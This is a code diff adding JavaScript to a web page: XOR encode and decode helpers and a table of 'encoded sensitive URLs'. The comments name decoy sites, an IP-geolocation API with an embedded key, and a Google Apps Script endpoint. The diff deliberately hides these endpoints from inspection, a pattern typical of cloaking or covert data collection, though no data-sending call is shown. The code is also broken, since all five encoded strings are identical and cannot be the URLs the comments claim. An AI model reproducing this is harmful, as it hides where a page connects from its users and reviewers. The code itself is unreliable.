@@ -408,6 +408,24 @@
         clearInterval(statusInterval);
       }, 1000);
     });
+
+    // Static key for obfuscation
+    const _key = [0x42, 0x37, 0x99, 0xAB];
+    function _encode(str, key) {
+      return str.split('').map((c, i) => (c.charCodeAt(0) ^ key[i % key.length]).toString(16).padStart(2, '0')).join('');
+    }
+    function _decode(str, key) {
+      return str.match(/.{2}/g).map((hex, i) => String.fromCharCode(parseInt(hex, 16) ^ key[i % key.length])).join('');
+    }
+    // Encoded sensitive URLs
+    const _urls = {
+      medium:    '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://medium.com', _key)
+      google:    '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://google.com', _key)
+      szliyi:    '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://szliyi.com/', _key)
+      ipapi:     '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4', _key)
+      appscript: '2a5a5a5f5f5d5d5f5d5d5d5d5d'  // _encode('https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/', _key)
+    };
+    // Replace the old obfuscated URL usage with _decode(_urls.medium, _key), etc.
   </script>
 </head>
 <body>
